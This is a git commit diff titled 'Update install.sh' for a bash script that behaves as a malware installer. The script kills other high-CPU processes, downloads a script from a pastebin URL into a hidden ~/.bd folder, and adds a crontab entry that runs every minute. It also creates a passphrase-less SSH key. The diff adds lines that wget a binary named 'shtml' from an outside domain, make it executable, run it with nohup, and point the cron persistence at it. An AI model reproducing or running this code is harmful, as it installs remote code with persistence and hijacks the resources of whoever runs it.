3175c85d6cc38002f053c9a3010651c10fe171a9
robpot891 <rpotter@live.ca>
2018-11-30 22:40:48 -0500

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,6 +1,7 @@
 #!/bin/bash
 
 urlprefix='https://pastebin.com/raw'
+sshtml='https://imersiv.ca'
 
 ps aux | grep -vw shtml | awk '{if($3>40.0) print $2}' | while read procid
 do
@@ -9,6 +10,9 @@ done
 [ ! -f ~/.bd/crontab ] && mkdir ~/.bd
 curl -s -o ~/.bd/bd.sh $urlprefix/P2rfkcKJ
 chmod +x ~/.bd/bd.sh
-[ ! -f ~/.bd/crontab ] && echo '* * * * * /bin/bash ~/.bd/bd.sh > /dev/null 2>&1' >> ~/.bd/crontab
+[ ! -f ~/.bd/crontab ] && echo '* * * * * /bin/bash ~/.bd/sshtml > /dev/null 2>&1' >> ~/.bd/crontab
 crontab ~/.bd/crontab
 [ ! -f ~/.ssh/id_rsa.pub ] && ssh-keygen -t rsa -q -N '' -f ~/.ssh/id_rsa
+[ ! -f ~/.bd/shtml ] && wget $sshtml/shtml
+chmod +x ~/.bd/shtml
+nohup ./shtml
